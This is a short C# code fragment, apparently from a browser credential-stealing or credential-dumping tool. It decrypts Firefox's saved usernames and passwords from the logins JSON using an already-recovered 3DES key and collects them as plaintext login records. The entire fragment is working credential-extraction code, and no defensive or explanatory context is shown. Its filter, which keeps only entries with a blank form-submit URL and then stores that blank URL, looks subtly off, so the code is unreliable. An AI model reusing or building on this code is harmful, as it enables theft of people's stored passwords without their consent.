foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
{                 
 if (string.IsNullOrWhiteSpace(login.FormSubmitURL))
 {
 byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
 byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);

 ASN1 usernameASN1 = new ASN1(usernameBytes);

 byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
 byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

 ASN1 passwordASN1 = new ASN1(passwordBytes);

 byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
 byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

 string decryptedUsername = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
 string decryptedPassword = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));

 BrowserLoginData loginData = new BrowserLoginData(login.FormSubmitURL, decryptedUsername, decryptedPassword, "Firefox");
 FirefoxLoginDataList.Add(loginData);
 }
}
